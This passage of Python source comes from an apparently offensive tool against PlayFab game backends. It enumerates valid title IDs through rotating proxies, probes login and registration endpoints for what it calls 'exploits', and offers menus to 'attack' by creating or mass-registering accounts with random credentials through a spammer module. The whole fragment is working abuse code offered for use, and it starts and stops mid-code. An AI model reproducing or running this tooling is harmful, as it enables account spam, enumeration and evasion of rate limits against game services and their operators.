        #posReq = requests.post(f"https://{posID}.playfabapi.com/Client/LoginWithCustomID", data=json.dumps({"TitleId" : posID}), headers={"Content-Type": "application/json"}, proxies={"http": Checkedproxies[proxIndex], "https": Checkedproxies[proxIndex]})
        response = CheckTitleID(posID, Checkedproxies[proxIndex])
        if response == "True":
            foundIDq = input(f"\n{art.info}[*] Found a valid PlayfabID!\n{art.question}(c)heck for exploits or (a)dd to file\n~>{art.main} ")
            if foundIDq.lower() == "c":
                FindExploits(posID)
                break
            elif foundIDq.lower() == "a":
                open("Found_IDs.txt", "a").write("\n"+posID)
                print(f"{Fore.GREEN}[?] Looking for more")
        elif response == "Proxy":
            proxIndex += 1

def PlayFabID(PFID:str):
    while True:
        print(f"{Fore.LIGHTCYAN_EX}[?] Checking if {PFID} is valid...")
        ValidReq = requests.post(f"https://{PFID}.playfabapi.com/Client/LoginWithCustomID", data=json.dumps({"TitleId" : PFID}), headers={"Content-Type": "application/json"})
        if ValidReq.json()['errorMessage'] != "Could not determine a title id for this.":
            print(f"{Fore.GREEN}[!] {PFID} is valid!")
            break
        else:
            print(f"{Fore.RED}[!] {PFID} is not valid")
            time.sleep(2)
            return
    print(art.PFID_MAIN)
    while True:
        Main_choice = input("~> ")
        match Main_choice:
            case "1":
                print("gulp")
            case "2":
                FindExploits(PFID)
        BackToPFIDMenu()

def FindExploits(EPFID:str):
    import random
    print(f"{art.main}[?] {random.choice(art.Rand_Exploit)}")
    AllExploits = {}

    CusIDheaders = {
        "Host": f"{EPFID}.playfabapi.com",
        "Content-Type": "application/json"}
    CusIDpayload={
        "CreateAccount": False,
        "CustomId": GenString(16),
        "TitleId": EPFID}
    dic_counter = 1
    CustomIDReq = requests.post(url=f"https://{EPFID}.playfabapi.com/Client/LoginWithCustomID",json=CusIDpayload, headers=CusIDheaders)
    if CustomIDReq.status_code == 400 and CustomIDReq.json()['error'] == "AccountNotFound": # Can login = can create acc
        AllExploits[dic_counter]="Account Creation"
        dic_counter+=1
    
    Regisheaders = {
        "Host": f"{EPFID}.playfabapi.com",
        "Content-Type": "application/json"}
    Regispayload={
        "TitleId": EPFID,
        "Email": f"{GenString(10)}@FCLOWN.com",
        "Password": "Password",
        "Username": f"{GenString(10)}",
        "DisplayName": f"{GenString(5)}"}
    RegisReq = requests.post(url=f"https://{EPFID}.playfabapi.com/Client/RegisterPlayFabUser", json=Regispayload, headers=Regisheaders) #FIX, this creates an acc
    if RegisReq.status_code == 200:
        AllExploits[dic_counter]="Account Registration"
        dic_counter+=1
    
    Promnt = f"{Fore.MAGENTA}[?] What would you like to attack with?\n"
    for num, expl in AllExploits.items():
        Promnt = f"{Promnt}\n{Fore.MAGENTA}{num}){Fore.YELLOW} {expl}"
    
    selected_attack = input(Promnt+f"\n{Fore.MAGENTA}~>{Fore.YELLOW} ")
    while True:
        try:
            selected_attack = int(selected_attack)
            if 1 <= selected_attack <= dic_counter - 1:
                chosen_attack = AllExploits[selected_attack]
                Exploits(chosen_attack, EPFID)
            else:
                print(f"{Fore.LIGHTRED_EX}Please enter a valid number")
        except ValueError:
            print(f"{Fore.LIGHTRED_EX}Please enter a valid number")

def Exploits(exploit:str, EPFID):
    match exploit:
        case 'Account Creation':
            choice = input(f"{Fore.MAGENTA}1){Fore.YELLOW} Create account\n{Fore.MAGENTA}2){Fore.YELLOW} Mass create accounts\n{Fore.MAGENTA}~>{Fore.YELLOW} ")
            if choice == '1':
                CusIDheaders = {
                    "Host": f"{EPFID}.playfabapi.com",
                    "Content-Type": "application/json"}
                CustomID = GenString(16)
                CusIDpayload={
                    "CreateAccount": True,
                    "CustomId": CustomID,
                    "TitleId": EPFID}
                CustomIDReq = requests.post(url=f"https://{EPFID}.playfabapi.com/Client/LoginWithCustomID",json=CusIDpayload, headers=CusIDheaders)
                if CustomIDReq.status_code == 200:
                    print(f"    {Fore.GREEN}PlayfabID: {CustomIDReq.json()['data']['PlayFabId']}\n    AccountID: {CustomIDReq.json()['data']['EntityToken']['Entity']['Id']}\n    Custom ID: {CustomID}")
                else:
                    print(f"{Fore.LIGHTRED_EX}Failed to create account")
            if choice == '2':
                CheckProxiesFiles()
                DeezeySpammer.run(EPFID, Checked_File, False) #Register accs
        case 'Account Registration':
            choice = input(f"{Fore.MAGENTA}1){Fore.YELLOW} Register Account\n{Fore.MAGENTA}2){Fore.YELLOW} Mass Register Accounts\n{Fore.MAGENTA}~>{Fore.YELLOW} ")